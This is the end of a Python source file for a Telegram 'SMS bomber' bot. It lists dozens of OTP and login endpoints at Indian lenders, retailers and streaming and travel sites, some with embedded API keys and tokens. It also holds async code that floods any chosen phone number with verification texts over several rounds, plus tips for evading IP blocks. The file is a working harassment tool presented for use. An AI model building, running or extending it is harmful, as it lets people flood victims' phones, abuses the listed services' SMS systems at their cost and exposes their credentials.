    {"name": "Figii", "url": "https://consumer.figii.in/api/auth/login/?mobile={phone}&partnerId=&productType=&clientToken=&programId=&sourceBy=&sourceType=", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://consumer.figii.in", "referer": "https://consumer.figii.in/login/"}, "body": '{"username":"{phone}","medium":"SMS","meta":{}}'},
    {"name": "MinutesLoan", "url": "https://apilm.minutesloan.com/api/v2/auth/send-signup", "method": "POST", "headers": {"Content-Type": "application/json", "domain": "app.minutesloan.com", "origin": "https://app.minutesloan.com", "referer": "https://app.minutesloan.com/"}, "body": '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"55000","panCard":"ABCDE5438F","brandId":"0dbae4da-461a-4959-aa82-6a788de61593","domain":"app.minutesloan.com"}'},
    {"name": "AyushmanLoan", "url": "https://backend.ayushmanloan.com/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://ayushmanloan.com", "referer": "https://ayushmanloan.com/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'},
    {"name": "Creditt", "url": "https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp/sent", "method": "POST", "headers": {"Content-Type": "application/json", "appStore": "web_app", "api_version": "1.0", "deviceId": "device_{random_id}", "trackingId": "tracking_{random_id}", "appVersion": "1.0.21", "platform": "3", "origin": "https://loan.credittnow.com", "referer": "https://loan.credittnow.com/"}, "body": '{"mobile":"{phone}"}'},
    {"name": "FundsBull", "url": "https://backend.fundsbull.com/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://fundsbull.com", "referer": "https://fundsbull.com/"}, "body": '{"phone_number":"{phone}"}'},
    {"name": "F1SpeedLoan", "url": "https://backend.f1speedloan.com/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://f1speedloan.com", "referer": "https://f1speedloan.com/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'},
    {"name": "FundoBaba", "url": "https://backend.fundobaba.com/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://fundobaba.com", "referer": "https://fundobaba.com/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'},
    {"name": "RupeeRedee", "url": "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP", "method": "POST", "headers": {"Content-Type": "application/json", "platform": "Web", "origin": "https://www.rupeeredee.com", "referer": "https://www.rupeeredee.com/"}, "body": '{"number":"+91{phone}","type":"Mobile"}'},
    {"name": "UdhaarPortal", "url": "https://crm.udhaarportal.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM=", "origin": "https://www.udhaarportal.com", "referer": "https://www.udhaarportal.com/"}, "body": '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'},
    {"name": "DuniyaFinance", "url": "https://backend.duniyafinance.in/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://duniyafinance.com", "referer": "https://duniyafinance.com/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'},
    {"name": "BlinkrLoan", "url": "https://backend.blinkrloan.com/api/user/v3/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.blinkrloan.com", "referer": "https://www.blinkrloan.com/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}","lat":"26.123456","lng":"77.123456","url":"https://www.blinkrloan.com/apply/pan-mobile"}'},
    {"name": "NaukriLoans", "url": "https://backend.naukriloans.com/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://naukriloans.com", "referer": "https://naukriloans.com/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'},
    {"name": "UdharCapital", "url": "https://www.udharcapital.com/api/send_otp.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://www.udharcapital.com", "referer": "https://www.udharcapital.com/apply-loan.php?slug=personal-loan"}, "body": "phone={phone}"},
    {"name": "SalaryBolt", "url": "https://backend.salarybolt.com/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://salarybolt.com", "referer": "https://salarybolt.com/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'},
    {"name": "SabkaLoan", "url": "https://api.sabkaloan.com/api/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://sabkaloan.com", "referer": "https://sabkaloan.com/"}, "body": '{"mobile":"{phone}"}'},
    {"name": "PaisaInTime", "url": "https://micro-server-for-paisaintime-nrbe5.ondigitalocean.app/api/auth/get_otp", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "08b61f94-4e99-4d4e-abe9-108a1078bbdb", "origin": "https://www.paisaintime.com", "referer": "https://www.paisaintime.com/"}, "body": '{"phoneNo":"{phone}","clientId":"08b61f94-4e99-4d4e-abe9-108a1078bbdb"}'},
    {"name": "FastPaise", "url": "https://backend.fastpaise.in/api/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://fastpaise.in", "referer": "https://fastpaise.in/"}, "body": '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'},
    {"name": "Penpencil", "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "method": "POST", "headers": {"Content-Type": "application/json", "client-type": "WEB", "client-id": "5eb393ee95fab7468a79d189", "origin": "https://www.pw.live", "referer": "https://www.pw.live/"}, "body": '{"mobile":"{phone}","countryCode":"+91","subOrgId":"SUB-PWLI000"}'},
    {"name": "RamFincorp", "url": "https://loan-api.ramfincorp.com/customers/customer-login-byMobile?utm_source=Spectrum_1203M_", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://loan.ramfincorp.com", "referer": "https://loan.ramfincorp.com/"}, "body": '{"mobile":"{phone}"}'},
    {"name": "InCred", "url": "https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.incred.com", "referer": "https://www.incred.com/"}, "body": '{"MOBILE":"{phone}","UTM_DETAILS":{"partnerId":"9250608873861026P"},"ON_BOARDING_TYPE":"FROM_LOAN_ENQUIRY","STATUS":"Pending"}'},
    {"name": "Sephora", "url": "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==", "origin": "https://sephora.in", "referer": "https://sephora.in/"}, "body": '{"mobile":"{phone}","country_code":"91"}'},
    {"name": "JioSaavn", "url": "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.jiosaavn.com", "referer": "https://www.jiosaavn.com/"}, "body": '{"phone_number":"+91{phone}"}'},
    {"name": "Cashvia", "url": "https://customer-backend.cashvia.in/customers/customer-login", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1", "origin": "https://applynow.cashvia.in", "referer": "https://applynow.cashvia.in/"}, "body": '{"phoneNo":"{phone}","journey_down":true}'},
    {"name": "RojgarKaro_SendOTP", "url": "https://rojgarkaro.in/api/auth/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://rojgarkaro.in", "referer": "https://rojgarkaro.in/"}, "body": '{"mobile_no":"{phone}","isSessionActive":false}'},
    {"name": "RojgarKaro_Signup", "url": "https://rojgarkaro.in/api/auth/sendOTPOnSignup", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://rojgarkaro.in", "referer": "https://rojgarkaro.in/signup"}, "body": '{"mobile_no":"{phone}","email_id":"test@gmail.com","isSessionActive":false}'},
    {"name": "BajajFinserv", "url": "https://apigateway.bajajfinserv.in/apigateway/otp/sso", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.bajajfinserv.in", "referer": "https://www.bajajfinserv.in/"}, "body": '{"mobileNumber":"{phone}","source":"WEB"}'},
    {"name": "TataCliq", "url": "https://www.tatacliq.com/api/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.tatacliq.com", "referer": "https://www.tatacliq.com/"}, "body": '{"mobile":"{phone}","state":"login"}'},
    {"name": "Droom", "url": "https://api.droom.in/v1/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://droom.in", "referer": "https://droom.in/"}, "body": '{"phone":"{phone}","country_code":"91"}'},
    {"name": "Yatra", "url": "https://secure.yatra.com/social/common/yatra/action/doMobileLogin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://www.yatra.com", "referer": "https://www.yatra.com/"}, "body": "mobileNo={phone}"},
    {"name": "Licious", "url": "https://www.licious.com/auth/api/v1/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.licious.com", "referer": "https://www.licious.com/"}, "body": '{"mobile":"{phone}","countryCode":"+91"}'},
    {"name": "CureFoods", "url": "https://web.curefoods.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://web.curefoods.com", "referer": "https://web.curefoods.com/"}, "body": '{"phone":"{phone}","country_code":"+91"}'},
    {"name": "Puma", "url": "https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://in.puma.com", "referer": "https://in.puma.com/"}, "body": "dwfrm_phone={phone}&format=ajax"},
    {"name": "Decathlon", "url": "https://www.decathlon.in/api/v1/auth/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.decathlon.in", "referer": "https://www.decathlon.in/"}, "body": '{"mobile":"{phone}","isLogin":true}'},
    {"name": "McDonalds", "url": "https://mcdelivery.mcdonaldsindia.com/api/v1/customer/otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://mcdelivery.mcdonaldsindia.com", "referer": "https://mcdelivery.mcdonaldsindia.com/"}, "body": '{"phoneNumber":"{phone}","source":"web"}'},
    {"name": "Dominos", "url": "https://pizzaonline.dominos.co.in/api/v1/auth/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://pizzaonline.dominos.co.in", "referer": "https://pizzaonline.dominos.co.in/"}, "body": '{"phone":"{phone}","source":"WEB"}'},
    {"name": "Zivame", "url": "https://www.zivame.com/auth/public/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.zivame.com", "referer": "https://www.zivame.com/"}, "body": '{"phone":"{phone}","countryCode":"IN"}'},
    {"name": "FirstCry", "url": "https://www.firstcry.com/api/v2/auth/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.firstcry.com", "referer": "https://www.firstcry.com/"}, "body": '{"phone":"{phone}"}'},
    {"name": "Netmeds", "url": "https://www.netmeds.com/api/v1/auth/login", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.netmeds.com", "referer": "https://www.netmeds.com/"}, "body": '{"mobile":"{phone}"}'},
    {"name": "Tata1mg", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.1mg.com", "referer": "https://www.1mg.com/"}, "body": '{"number":"{phone}","login_with":"mobile"}'},
    {"name": "Upstox", "url": "https://api.upstox.com/v2/login/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://upstox.com", "referer": "https://upstox.com/"}, "body": '{"mobile":"{phone}","client_id":"UPSTOX"}'},
    {"name": "Zerodha", "url": "https://kite.zerodha.com/api/login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://kite.zerodha.com", "referer": "https://kite.zerodha.com/"}, "body": "user_id={phone}"},
    {"name": "Groww", "url": "https://groww.in/api/v2/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://groww.in", "referer": "https://groww.in/"}, "body": '{"phone":"{phone}","platform":"WEB"}'},
    {"name": "PolicyBazaar", "url": "https://www.policybazaar.com/api/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.policybazaar.com", "referer": "https://www.policybazaar.com/"}, "body": '{"mobile":"{phone}","source":"web"}'},
    {"name": "Ditto", "url": "https://www.dittotv.in/auth/sendOTP/v1", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.dittotv.in", "referer": "https://www.dittotv.in/"}, "body": '{"mobileno":"{phone}","sendOTP":true}'},
    {"name": "SonyLiv", "url": "https://www.sonyliv.com/api/v1/auth/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.sonyliv.com", "referer": "https://www.sonyliv.com/"}, "body": '{"phone":"{phone}","countryCode":"+91"}'},
    {"name": "Hotstar", "url": "https://api.hotstar.com/r9/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.hotstar.com", "referer": "https://www.hotstar.com/"}, "body": '{"phone":"{phone}","countryCode":"IN"}'},
    {"name": "BookMyShow_SMS", "url": "https://in.bookmyshow.com/auth/send/otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://in.bookmyshow.com", "referer": "https://in.bookmyshow.com/"}, "body": '{"mobile":"{phone}"}'},
    {"name": "RentoMojo_Signup", "url": "https://www.rentomojo.com/api/RMUsers/signup", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.rentomojo.com", "referer": "https://www.rentomojo.com/"}, "body": '{"phone":"{phone}","password":"Test@123","name":"Test User"}'},
    {"name": "Furlenco", "url": "https://www.furlenco.com/api/v1/auth/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.furlenco.com", "referer": "https://www.furlenco.com/"}, "body": '{"phone":"{phone}","term":"true"}'},
    {"name": "CityFurnish", "url": "https://www.cityfurnish.com/api/v1/auth/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.cityfurnish.com", "referer": "https://www.cityfurnish.com/"}, "body": '{"phone":"{phone}"}'},
    {"name": "Ixigo", "url": "https://www.ixigo.com/api/v2/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.ixigo.com", "referer": "https://www.ixigo.com/"}, "body": '{"mobile":"{phone}","countryCode":"+91"}'},
    {"name": "EaseMyTrip", "url": "https://www.easemytrip.com/api/otp/SendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.easemytrip.com", "referer": "https://www.easemytrip.com/"}, "body": '{"Mobileno":"{phone}","Type":"M"}'},
    {"name": "Goibibo", "url": "https://www.goibibo.com/api/v2/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.goibibo.com", "referer": "https://www.goibibo.com/"}, "body": '{"mobile":"{phone}","countryCode":"+91"}'},
    {"name": "RedBus", "url": "https://www.redbus.in/api/v2/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.redbus.in", "referer": "https://www.redbus.in/"}, "body": '{"mobile":"{phone}","source":"web"}'},
    {"name": "Rapido_SMS", "url": "https://rapido.bike/api/v1/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://rapido.bike", "referer": "https://rapido.bike/"}, "body": '{"mobile":"{phone}","source":"SMS"}'},
    {"name": "PocketMoney", "url": "https://api2.the-pocket-money.com/pokktmoney/send_verification_code?os_type=16&device_id=&device_model=&carrier_name=null&country_code=91&verification_phone={phone}", "method": "GET", "headers": {"X-Verification-Key": "NTk2OTJjNzI3NzAwZDdkYjQxYmM5N2Y1MzlmNTA2NmM=", "X-POCKET-KEY": "FwMqEpp8XHfrR8xBTGiteY62q3NW96ulwqkGeY7lDU7hfYZ7H4DJPITtTZwyfWj1"}, "body": None},
    {"name": "MagicPin_SMS", "url": "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "method": "POST", "headers": {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT", "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp", "referer": "https://magicpin.in/"}, "body": '{"phoneNumber":"91{phone}","authMethod":"sms","token":""}'},
    {"name": "Udaan_SMS", "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "x-app-id": "udaan-auth", "origin": "https://auth.udaan.com", "referer": "https://auth.udaan.com/"}, "body": "mobile={phone}"},
    {"name": "SmartCoin_SMS", "url": "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "user_platform": "WEBFLOW", "platform_code": "olyv", "origin": "https://app.olyv.co.in"}, "body": '{"phone_number":"{phone}","app_version":"100101","channel":"SMS","request_type":"REGISTRATION","onboarding_consent":true}'},
    {"name": "OLX_SMS", "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "method": "POST", "headers": {"Content-Type": "application/json", "user-agent": "okhttp/3.9.1"}, "body": '{"method":"sms","phone":"{phone}","language":"en-IN","grantType":"retry"}'},
    {"name": "Codfirm_SMS", "url": "https://api.codfirm.in/api/customers/login/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "x-csrf-token": "bXk9WldL-j4gsD033RFgKkp1R7vsCBqaf6XI"}, "body": '{"medium":"sms","storeUrl":"clinikally.myshopify.com","phone":"{phone}"}'},
    {"name": "CreditSea2", "url": "https://backend.creditsea.com/api/v1/otp/generate-otp", "method": "POST", "headers": {"Content-Type": "application/json", "platform": "CREDITSEA"}, "body": '{"phoneNumber":"{phone}","fromLoginPage":true,"isWebUser":true}'},
    {"name": "MuscleBlaze2", "url": "https://www.muscleblaze.com/veronica/user/validate/9/{phone}/signup?plt=2&st=9", "method": "GET", "headers": {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2", "device": "ba278273cbf1180"}, "body": None},
    {"name": "Penpencil_SMS", "url": "https://api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json", "version": "0.0.1", "subOrgId": "SUB-PWST002", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB"}, "body": '{"mobile":"{phone}","firstName":"djdk","lastName":"","countryCode":"+91","subOrgId":""}'},
    {"name": "Oziva_SMS", "url": "https://api.prod.oziva.in/nitro/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}","source":"order_management","type":"sms","consentForAddressUse":false}'},
    {"name": "Astroyogi_SMS", "url": "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3", "method": "POST", "headers": {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."}, "body": '{"PhoneNumber":"{phone}","PhoneCode":"91","Domain":"Web","CountryId":"IN","IpAddress":"117.225.1.174","CountryCodeByHeader":"IN"}'},
    {"name": "Refyne_SMS", "url": "https://prod-api.refyne.co.in/auth/v3/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"channel":"SMS","recipient":"{phone}"}'},
    {"name": "Housing3", "url": "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "method": "POST", "headers": {"Content-Type": "application/json", "phoenix-api-name": "LOGIN_SEND_OTP_API", "app-name": "mobile_web_buyer"}, "body": '{"query":"mutation($email:String,$phone:String,$otpLength:Int,$userAgent:String,$method:String,$preference:String,$channel:String){sendOtp(phone:$phone,email:$email,otpLength:$otpLength,userAgent:$userAgent,method:$method,preference:$preference,channel:$channel){success message}}","variables":{"phone":"{phone}","userAgent":"Mozilla/5.0","otpLength":4}}'},
    {"name": "HERE_SMS", "url": "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"sms"}'},
    {"name": "VisitApp_SMS", "url": "https://api.getvisitapp.com/v3/new-auth/login-phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"phone":"{phone}","countryCode":91,"platform":"WEB","ssoInfo":null,"storedUTMParams":{},"emailCode":"","evId":""}'},
    {"name": "RegistaniaChar_SMS", "url": "https://admin.registaniachar.com/api/whatsapp/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "X-Signature": "6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"}, "body": '{"phone":"{phone}"}'},
    {"name": "Codfirm2", "url": "https://api.codfirm.in/api/customers/login/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "x-csrf-token": "bXk9WldL-j4gsD033RFgKkp1R7vsCBqaf6XI"}, "body": '{"medium":"sms","storeUrl":"clinikally.myshopify.com","phone":"{phone}"}'},
    {"name": "MuscleBlaze3", "url": "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9", "method": "GET", "headers": {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2", "device": "ba278273cbf1180"}, "body": None},
    {"name": "Astroyogi_Comm", "url": "https://comm.astroyogi.com/api/OtpComm/SendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."}, "body": '{"phoneCode":"91","countryCode":"IN","mobileNumber":"{phone}","platform":"Web","IpAddress":"117.225.1.174","requestType":"sms","countryCodeByHeader":"IN"}'},
    {"name": "Refyne2", "url": "https://prod-api.refyne.co.in/auth/v3/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"channel":"WHATSAPP","recipient":"{phone}"}'},
    {"name": "MakeMyTrip_SMS", "url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr", "method": "POST", "headers": {"Content-Type": "application/json", "vid": "{uuid}", "tid": "{uuid}", "deviceid": "{uuid}", "region": "in", "language": "eng", "currency": "inr"}, "body": '{"loginId":"{phone}","type":6,"isEncoded":false,"channel":["MOBILE"],"appHashKey":"@www.makemytrip.com #","countryCode":"91"}'},
    {"name": "IGP_SMS", "url": "https://www.igp.com/v2/loginSignup", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "body": '{"email":"","mprefix":"91","mob":"{phone}","cid":"99","claimNumber":false,"newUserFlag":false,"verifyOtp":false,"otp":"","isGuest":false,"isInternational":false}'},
    {"name": "FreeCharge_SMS", "url": "https://www.freecharge.in/api/ims/rest/otp/resend", "method": "POST", "headers": {"Content-Type": "application/json", "csrfRequestIdentifier": "{uuid}", "fcChannel": "12"}, "body": '{"otpId":"{uuid}","otpThroughCall":false,"platformType":"WEB"}'},
    {"name": "Happi_SMS", "url": "https://dev-services.happimobiles.com/api/user-login/homepage", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": '{"mobile":"{phone}"}'},
    {"name": "Hotstar_SMS", "url": "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=sendOtp&page_enum=onboarding_login", "method": "POST", "headers": {"Content-Type": "application/json", "x-hs-platform": "mweb", "x-country-code": "in"}, "body": '{"body":{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","initiate_by":0,"recaptcha_token":"","phone_number":"{phone}"}}'},
    {"name": "ThakurBombCyber", "url": "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "body": None}
]

# ============================================================
# HELPERS
# ============================================================
def validate_number(number: str) -> bool:
    return number.isdigit() and len(number) == 10

def build_text(template, phone):
    if template is None:
        return None
    return template.replace("{phone}", phone).replace("{timestamp}", str(int(time.time() * 1000))).replace("{uuid}", str(uuid.uuid4()))

async def fire_api(session, api, phone, sem):
    async with sem:
        try:
            url = build_text(api["url"], phone)
            body = build_text(api["body"], phone)
            headers = {k: build_text(v, phone) for k, v in api["headers"].items()}
            
            async with session.request(api["method"], url, headers=headers, data=body, timeout=PER_API_TIMEOUT) as resp:
                return 200 <= resp.status < 400
        except Exception:
            return False

# ============================================================
# BOT COMMANDS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"💥 *SMS BOMBER BOT (Full APIs)*\n\n"
        f"👤 Hello {user.first_name}!\n\n"
        f"📌 *Usage:*\n"
        f"`/bomb <phone> <rounds>`\n\n"
        f"📞 *Example:*\n"
        f"`/bomb 9876543210 1`\n\n"
        f"⚡ *Each round fires {len(APIS)} APIs directly*\n"
        f"🚀 *Concurrent requests: {MAX_CONCURRENT}*\n\n"
        f"🔹 *Note: Cloud IP block ho sakta hai. Result 0 aaye toh ghar ke net pe try karein.*",
        parse_mode=ParseMode.MARKDOWN
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) < 2:
        await update.message.reply_text(
            "❌ *Usage:* `/bomb <phone> <rounds>`\n"
            "Example: `/bomb 9876543210 1`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    number = args[0].strip()
    try:
        rounds = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ *Rounds must be a number!*", parse_mode=ParseMode.MARKDOWN)
        return

    if not validate_number(number):
        await update.message.reply_text("❌ *Invalid phone number!* Must be 10 digits.", parse_mode=ParseMode.MARKDOWN)
        return

    if rounds < 1 or rounds > 10:
        await update.message.reply_text("❌ *Rounds must be between 1 and 10.*", parse_mode=ParseMode.MARKDOWN)
        return

    total_apis = len(APIS) * rounds
    status_msg = await update.message.reply_text(
        f"⏳ *Bombing {number} with {rounds} rounds...*\n"
        f"🚀 Total API calls: {total_apis}\n"
        f"⚡ Concurrency: {MAX_CONCURRENT} parallel",
        parse_mode=ParseMode.MARKDOWN
    )

    total_success = 0
    total_failed = 0
    start_ts = time.time()

    sem = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(rounds):
            for api in APIS:
                tasks.append(asyncio.create_task(fire_api(session, api, number, sem)))
        
        chunk_size = 20
        for i in range(0, len(tasks), chunk_size):
            chunk = tasks[i:i+chunk_size]
            results = await asyncio.gather(*chunk)
            for ok in results:
                if ok: total_success += 1
                else: total_failed += 1
            
            try:
                await status_msg.edit_text(
                    f"⏳ *Bombing {number}...*\n\n"
                    f"✅ Success: `{total_success}`\n"
                    f"❌ Failed: `{total_failed}`\n"
                    f"📊 Progress: `{total_success + total_failed}/{total_apis}`",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass

    elapsed = int(time.time() - start_ts)
    await status_msg.edit_text(
        f"✅ *Bombing Complete!*\n\n"
        f"📞 Number: `{number}`\n"
        f"📊 Total APIs Fired: `{total_apis}`\n"
        f"✅ Success (200 OK): `{total_success}`\n"
        f"❌ Failed: `{total_failed}`\n"
        f"⏱ Time: `{elapsed}s`\n\n"
        f"⚠️ *Agar success zyada hai par OTP nahi aaye, toh matlab target ke network/carrier ne block kiya hai ya Cloud IP block hua hai.*",
        parse_mode=ParseMode.MARKDOWN
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🤖 *SMS Bomber Bot*\n\n"
        f"📌 *Commands:*\n"
        f"/start - Show welcome\n"
        f"/bomb <phone> <rounds> - Start bombing\n"
        f"/help - Show this",
        parse_mode=ParseMode.MARKDOWN
    )

# ============================================================
# MAIN
# ============================================================
def main():
    print(f"🤖 Bot starting... APIs Loaded: {len(APIS)}")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("help", help_command))
    app.run_polling(allowed_updates=["message"])

if __name__ == "__main__":
    main()
